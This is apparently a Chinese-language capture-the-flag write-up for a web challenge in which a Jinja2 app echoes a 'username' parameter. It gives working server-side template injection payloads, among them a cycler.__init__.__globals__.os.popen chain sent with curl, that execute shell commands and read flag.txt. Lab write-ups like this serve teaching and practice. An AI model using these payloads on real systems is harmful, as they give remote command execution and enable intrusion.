## 题解

### 入口与指纹

`uvicorn`（FastAPI/Flask + Jinja2），页面标题 `Directory Listing`。

页面直接把题目意图写在正文里：

```text
You can call this URL with a username querystring parameter,
anything you put there will be shown on the page.
Can you think of a way to exploit this?
HINT: This is the directory listing for this app.
```

同时列出了应用目录：

```text
./
  main.py
  prestart.sh
  flag.txt        ← 目标
  Dockerfile
  templates/
    index.html
```

`?username=` 的值会被回显（`Welcome ZZ!`）。

### 关键观察

**1. 回显走的是 Jinja2 模板求值。**

```bash
curl --get --data-urlencode 'username={{7*7}}' http://$T/
# Welcome 49!
```

**2. `cycler.__init__.__globals__` 直通 os。**

```bash
curl --get \
  --data-urlencode "username={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" \
  http://$T/
# Welcome flag{3de815cc-…}!
```

同页的 `{{ self.__init__.__globals__ }}` 也能 dump 出 `jinja2.runtime` 的全局字典，
可作为后备手法。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode "username={{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" \
  "http://$T/" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

应用目录下的 `flag.txt`（页面自己的目录列表就把文件名列出来了）。

## 复盘

- **目录列表直接给出目标文件名。** `flag.txt` 就写在那里，省掉猜路径的步骤；
  这也是「页面把目录树打出来」这类题的常见设计。
- **`{{7*7}}` → 49 一步确认 SSTI。** 回显型参数 + Jinja2 是高频组合。
- **`cycler` 比 `lipsum`/`config` 更稳。** 本页 `{{ config }}` 返回空，
  说明模板上下文里没有 Flask 的 `config`；`cycler` 是 Jinja2 内置全局，一定存在。
- **`self.__init__.__globals__` 可作为二级确认。** 它能 dump 出运行时全局字典，
  用来验证引擎版本与可用模块。两条路都通，说明不是特例。
